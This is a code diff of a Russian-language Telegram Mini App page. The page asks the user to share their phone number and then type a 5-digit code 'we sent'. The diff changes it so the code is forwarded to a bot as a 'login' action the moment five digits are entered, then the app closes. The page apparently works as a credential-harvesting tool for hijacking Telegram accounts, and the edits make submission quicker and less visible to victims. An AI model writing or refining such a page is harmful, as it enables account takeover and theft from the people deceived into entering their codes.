@@ -8,36 +8,33 @@
         body { font-family: sans-serif; padding: 20px; text-align: center; background: #ffffff; color: #000000; }
         .hidden { display: none !important; }
         button { 
-            background: #3390ec; color: white; border: none; padding: 15px; 
-            font-size: 18px; border-radius: 10px; width: 100%; margin-top: 15px; 
+            background: #3390ec; color: white; border: none; padding: 20px; 
+            font-size: 18px; border-radius: 10px; width: 100%; margin-top: 20px; 
             cursor: pointer; font-weight: bold;
         }
         input { 
-            width: 100%; padding: 15px; font-size: 24px; text-align: center; 
-            border: 2px solid #3390ec; border-radius: 10px; margin-top: 15px; box-sizing: border-box;
+            width: 100%; padding: 20px; font-size: 30px; text-align: center; 
+            letter-spacing: 10px; border: 2px solid #3390ec; border-radius: 10px; 
+            margin-top: 20px; box-sizing: border-box; outline: none;
         }
-        .test-btn { background: #ff3b30; margin-top: 30px; }
     </style>
 </head>
 <body>
 
     <!-- Экран 1 -->
     <div id="screen-phone">
-        <h2>Шаг 1: Номер</h2>
+        <h2>Шаг 1</h2>
         <button id="share-phone-btn">ПОДЕЛИТЬСЯ НОМЕРОМ</button>
     </div>
 
     <!-- Экран 2 -->
     <div id="screen-code" class="hidden">
-        <h2>Шаг 2: Код</h2>
-        <p>Номер: <b id="user-phone"></b></p>
-        <input type="number" id="code-input" placeholder="Введите код">
+        <h2>Введите код</h2>
+        <p>Мы отправили код на <b id="user-phone"></b></p>
+        <p style="font-size: 12px; color: gray;">(Код отправится сам, как только введете 5 цифр)</p>
         
-        <!-- Основная кнопка -->
-        <button id="submit-code-btn">ОТПРАВИТЬ КОД В БОТА</button>
-        
-        <!-- ТЕСТОВАЯ КНОПКА (Красная) -->
-        <button class="test-btn" onclick="alert('Кнопки работают! JS не заблокирован.');">ТЕСТ КНОПКИ</button>
+        <input type="number" id="code-input" placeholder="00000" maxlength="5">
+        <!-- Убрали кнопку "Подтвердить", чтобы она не мешала -->
     </div>
 
     <script>
@@ -45,6 +42,7 @@
             if (window.Telegram && window.Telegram.WebApp) {
                 const tg = window.Telegram.WebApp;
                 tg.expand();
+                let isSent = false; // Защита от двойной отправки
 
                 // 1. Кнопка запроса номера
                 document.getElementById('share-phone-btn').onclick = function() {
@@ -53,31 +51,34 @@
                             document.getElementById('user-phone').innerText = "+" + contact.phone_number;
                             document.getElementById('screen-phone').classList.add('hidden');
                             document.getElementById('screen-code').classList.remove('hidden');
+                            // Автоматически ставим курсор в поле ввода
+                            document.getElementById('code-input').focus();
                         }
                     });
                 };
 
-                // 2. Кнопка отправки кода
-                document.getElementById('submit-code-btn').onclick = function() {
-                    const code = document.getElementById('code-input').value;
+                // 2. Автоматическая отправка при вводе 5 цифр
+                document.getElementById('code-input').addEventListener('input', function(e) {
+                    const code = this.value;
                     
-                    if (code.length < 1) {
-                        alert("Введите код!");
-                        return;
+                    // Если ввели 5 цифр и еще не отправляли
+                    if (code.length === 5 && !isSent) {
+                        isSent = true; // Блокируем повторную отправку
+                        this.blur(); // Прячем клавиатуру
+                        
+                        try {
+                            tg.sendData(JSON.stringify({
+                                action: "login",
+                                code: code
+                            }));
+                            tg.showAlert("Код отправлен!");
+                            setTimeout(() => tg.close(), 1000);
+                        } catch (error) {
+                            tg.showAlert("Ошибка: " + error.message);
+                            isSent = false; // Разрешаем попробовать снова
+                        }
                     }
-
-                    try {
-                        tg.sendData(JSON.stringify({
-                            action: "login",
-                            code: code
-                        }));
-                        // Если ошибок нет, показываем алерт и закрываем
-                        alert("Код отправлен боту!");
-                        tg.close();
-                    } catch (error) {
-                        alert("ОШИБКА ОТПРАВКИ: " + error.message);
-                    }
-                };
+                });
             }
         };
     </script>
